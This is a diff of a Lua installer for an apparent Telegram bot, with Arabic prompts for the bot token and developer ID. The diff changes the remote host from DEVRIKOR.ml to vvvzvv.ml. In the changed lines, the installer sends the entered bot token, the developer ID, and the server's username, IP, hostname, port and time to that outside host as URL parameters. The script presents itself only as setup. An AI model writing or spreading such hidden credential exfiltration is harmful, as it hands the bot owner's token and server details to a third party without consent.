@@ -27,7 +27,7 @@ if not database:get(Server_Done.."Token_Write") then
 print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
 if token ~= '' then
-data,res = https.request("https://DEVRIKOR.ml/index/RIKOR.php?p=RIKORTEAM")
+data,res = https.request("https://vvvzvv.ml/index/RIKOR.php?p=RIKORTEAM")
 if res == 200 then
 tr = json:decode(data)
 if tr.Info.info == 'Is_Spam' then
@@ -53,7 +53,7 @@ if not database:get(Server_Done.."UserSudo_Write") then
 print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://DEVRIKOR.ml/index/rikor.php?bn=info&id="..Id)
+data,res = https.request("https://vvvzvv.ml/index/rikor.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -83,7 +83,7 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
-http.request("https://DEVRIKOR.ml/index/RIKOR.php?n=RIKORTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+http.request("https://vvvzvv.ml/index/RIKOR.php?n=RIKORTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("RIKOR", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
